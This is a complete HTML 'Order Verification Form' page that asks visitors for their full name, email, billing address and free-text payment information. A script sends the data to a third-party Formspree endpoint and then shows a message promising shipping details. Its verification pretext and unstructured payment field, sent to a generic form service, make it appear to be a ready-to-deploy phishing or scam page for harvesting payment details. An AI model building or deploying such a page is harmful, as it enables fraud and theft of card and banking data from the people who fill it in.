<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Order Verification Form</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 20px; background: #f9f9f9; }
    .container { max-width: 500px; margin: auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    h2 { text-align: center; color: #333; }
    label { display: block; margin-top: 15px; font-weight: bold; }
    input, textarea { width: 100%; padding: 8px; margin-top: 5px; border-radius: 4px; border: 1px solid #ccc; }
    button { margin-top: 20px; width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
    button:hover { background: #0056b3; }
    .note { margin-top: 10px; font-style: italic; color: #666; font-size: 14px; }
    .success-message { display:none; color: green; margin-top: 20px; text-align: center; font-weight: bold; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Order Verification Form</h2>
    <form id="verification-form" action="https://formspree.io/f/{your-form-id}" method="POST">
      <label for="fullname">Full Name</label>
      <input type="text" id="fullname" name="fullname" required />
      
      <label for="email">Email Address</label>
      <input type="email" id="email" name="_replyto" required />
      
      <label for="address">Billing Address</label>
      <textarea id="address" name="address" rows="3" required></textarea>
      
      <label for="paymentinfo">Payment Information</label>
      <textarea id="paymentinfo" name="paymentinfo" rows="3" required></textarea>
      
      <div class="note">Make sure this information matches your payment information for verification purposes.</div>
      
      <button type="submit">Submit Verification</button>
    </form>
    <div class="success-message" id="success-message">
      Your form is being reviewed. You will receive your shipping information within 1-2 business days.
    </div>
  </div>

  <script>
    const form = document.getElementById('verification-form');
    const successMessage = document.getElementById('success-message');
    form.addEventListener('submit', (e) => {
      e.preventDefault();

      const data = new FormData(form);
      fetch(form.action, {
        method: 'POST',
        headers: { 'Accept': 'application/json' },
        body: data,
      }).then(response => {
        if (response.ok) {
          form.style.display = 'none';
          successMessage.style.display = 'block';
        } else {
          alert('Oops! There was a problem submitting your form.');
        }
      }).catch(() => {
        alert('Oops! There was a problem submitting your form.');
      });
    });
  </script>
</body>
</html>
